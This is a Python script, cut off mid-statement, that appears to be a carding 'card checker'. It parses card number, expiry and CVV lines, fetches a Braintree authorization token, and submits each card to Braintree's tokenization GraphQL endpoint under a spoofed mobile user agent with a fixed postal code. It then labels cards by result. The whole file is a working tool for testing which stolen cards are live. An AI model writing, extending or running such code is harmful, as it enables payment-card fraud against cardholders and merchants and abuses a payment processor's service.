import httpx
import re
import random
import string
import asyncio
import uuid
import json
from braintree_auth import get_braintree_auth

async def process_card(cc):
    try:
        cc_number, month, year, cvv = cc.strip().split('|')
    except ValueError:
        return f"{cc} INVALID FORMAT ❌"

    user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

    # Get Braintree authorization fingerprint
    braintree_token = await get_braintree_auth()
    if not braintree_token:
        return f"{cc} ERROR: Failed to retrieve Braintree auth token ❌"

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': f'Bearer {braintree_token}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'user-agent': user_agent,
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { last4 } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc_number,
                    'expirationMonth': month,
                    'expirationYear': year,
                    'cvv': cvv,
                    'billingAddress': {'postalCode': "10001"},
                }
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    async with httpx.AsyncClient() as client:
        response = await client.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        response_json = response.json()

    if "tokenizeCreditCard" in response_json
